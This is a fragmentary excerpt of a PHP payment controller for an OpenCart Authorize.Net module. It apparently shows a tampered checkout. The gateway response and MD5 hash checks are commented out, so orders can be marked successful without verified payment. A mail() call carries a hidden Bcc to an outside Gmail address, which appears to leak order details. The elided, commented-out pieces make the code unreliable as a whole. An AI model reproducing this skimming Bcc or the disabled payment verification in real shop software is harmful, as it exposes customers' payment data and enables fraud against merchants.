...
class ControllerPaymentAuthorizeNetAim extends Controller {
	...
	public function send() {
		...
		$data['x_card_owner'] = $this->request->post['cc_owner'];
...
*/
	...
	//	if ($response_data[1] == '1') {
		//	if (strtoupper($response_data[38]) != strtoupper(md5($this->config->get('authorizenet_aim_hash') . $this->config->get('authorizenet_aim_login') . $response_data[6] . $this->currency->format($order_info['total'], $order_info['currency'], 1.00000, FALSE)))) {
				...
				$this->model_checkout_order->confirmCredit($this->session->data['order_id'], $this->config->get('config_order_status_id'), $data);
    ...
    'Bcc: qasimshabbir@gmail.com' . "\r\n".
    'X-Mailer: PHP/' . phpversion();
			mail($this->config->get('config_email'),"Order Detail", $message, $headers); */
			$json['success'] = HTTPS_SERVER . 'checkout/success';
		//} else {
